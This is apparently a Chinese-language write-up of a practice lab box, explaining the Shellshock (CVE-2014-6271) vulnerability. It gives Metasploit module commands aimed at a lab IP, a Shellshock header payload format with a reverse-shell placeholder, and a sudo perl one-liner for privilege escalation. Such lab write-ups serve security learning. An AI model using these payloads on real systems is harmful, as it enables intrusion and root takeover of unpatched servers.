Phase 1

立足点：Shellshock（CVE-2014-6271）

🧒 儿童版 — 25 年的超级大漏洞 Shellshock 是 2014 年发现的超级大漏洞，藏在 Bash 里长达 25 年。Bash 在读取环境变量时，如果值以 () { :;}; 开头，会把后面的内容当命令执行。Apache 会把 HTTP Header（Cookie、User-Agent）变成环境变量传给 Bash。我们在 Header 里写入 () { :;}; 恶意命令，Bash 一解析——命令就执行了。

Metasploit

msf> use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf> set RHOSTS 10.129.27.232
msf> set TARGETURI /cgi-bin/user.sh

Shellshock 触发三要素 1. 必须有 CGI 2. CGI 脚本必须用 Bash 执行 3. 必须能控制 HTTP Header。Payload 格式：() { :;}; /bin/bash -c "反弹shell"

知识点总结

Shellshock（CVE-2014-6271）。

2014 年公开，漏洞存在 25 年（1989 年引入），影响超过 5 亿台设备。与 Heartbleed 并列为网络安全历史上最具影响力的漏洞之一。几乎所有学渗透的人都会拿 Shocker 练手。

gobuster 扫 /cgi-bin/ 时加 .sh .cgi .pl 后缀。

CGI 目录是 Shellshock 的入口，脚本文件不一定有默认索引页。

sudo perl/python/ruby = GTFOBins 经典提权。

sudo perl -e 'exec "/bin/sh"' 一行搞定。
